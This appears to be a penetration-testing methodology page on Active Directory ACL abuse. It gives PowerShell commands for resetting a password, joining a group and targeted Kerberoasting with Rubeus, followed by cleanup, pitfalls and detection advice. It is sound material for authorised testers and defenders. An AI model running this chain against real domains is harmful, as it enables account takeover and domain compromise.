---
layout: page
title: "ACL Abuse"
subtitle: "Chain object rights into control of a privileged account, then undo every change"
permalink: /methodology/active-directory/acl-abuse/
---

ACL abuse turns the rights found in [ACL Enumeration](/methodology/active-directory/acl-enumeration/) into control of an account you were not given. The notes walk through a three-hop chain: reset a password you hold rights over, use that account to join a group, then use the group's rights over a third account to obtain its password or its replication rights. Every hop changes something in the domain. Each change must be recorded, approved by the client, and reversed during cleanup.

## Workflow

1. Confirm the path from ACL enumeration and write it down before you act.
2. Get written approval for each change, especially password resets.
3. Perform one hop at a time, and verify it before moving on.
4. Stop at the point where the engagement goal is met.
5. Clean up every change in reverse order.

## Step 1: Reset a password you can change

The first account (USERNAME) holds ForceChangePassword over the intermediate account. Build a credential object, then reset the password:

```powershell
$SecPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)

$NewPassword = ConvertTo-SecureString 'NEW_PASSWORD' -AsPlainText -Force
Set-DomainUserPassword -Identity INTERMEDIATE_USER -AccountPassword $NewPassword -Credential $Cred -Verbose
```

Skip the credential object if you are already running as that user.

## Step 2: Join a group you can change

Authenticate as the intermediate account. It has GenericWrite over a group, so add yourself or another account to it:

```powershell
$SecPassword2 = ConvertTo-SecureString 'NEW_PASSWORD' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\INTERMEDIATE_USER', $SecPassword2)

Add-DomainGroupMember -Identity 'TARGET_GROUP' -Members 'INTERMEDIATE_USER' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity 'TARGET_GROUP' | Select MemberName
```

Membership in a nested group also grants that group's rights. In the notes, the help desk group was nested in a group with GenericAll over the final target.

## Step 3: Take control of the target account

GenericAll over a user allows a targeted Kerberoast. Set a fake SPN on the target, request its service ticket, then crack the ticket offline:

```powershell
Set-DomainObject -Credential $Cred2 -Identity TARGET_USER -SET @{serviceprincipalname='FAKE_SPN/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap
```

From Linux, the `targetedKerberoast` tool performs the same steps. If the target holds replication rights, the next step is DCSync (see [DCSync](/methodology/active-directory/dcsync/)). Alternatively, a password reset can give you the account directly, if the rules allow it.

## Cleanup

Revert the changes in reverse order, and confirm each one:

```powershell
Set-DomainObject -Credential $Cred2 -Identity TARGET_USER -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity 'TARGET_GROUP' -Members 'INTERMEDIATE_USER' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity 'TARGET_GROUP' | Select MemberName | ? {$_.MemberName -eq 'INTERMEDIATE_USER'}
```

1. Remove the fake SPN from the target account.
2. Remove the intermediate account from the group, and confirm it is gone.
3. Restore the intermediate account's password to its original value if known, or ask the client to reset it and notify the account owner.

> Record the original state of every object before you change it, including the original SPN list, group membership, and password status. Without that record, cleanup is guesswork.
{: .warning }

## What to look for

- A chain of rights that reaches a privileged object in few hops
- Nested groups that extend a right to more accounts than expected
- Targets with replication rights, which give the most direct path to domain compromise

## Pitfalls

- Password resets lock out the real owner and can cause outages. Get approval first, and tell the owner when it is done.
- A fake SPN that is not removed can break authentication for the target account.
- Verify each hop before the next. A failed group add does not mean the path is dead, but you need to know why it failed.

## Detection and remediation

- Audit for dangerous ACLs on a regular schedule, and remove the ones that are not needed. Train staff to run BloodHound so they can find these paths themselves.
- Monitor group membership of all high-impact groups. A change to one can be the middle of an ACL attack chain.
- Enable the advanced security audit policy. Event ID `5136` appears when a domain object is modified, including an ACL change to the domain object.
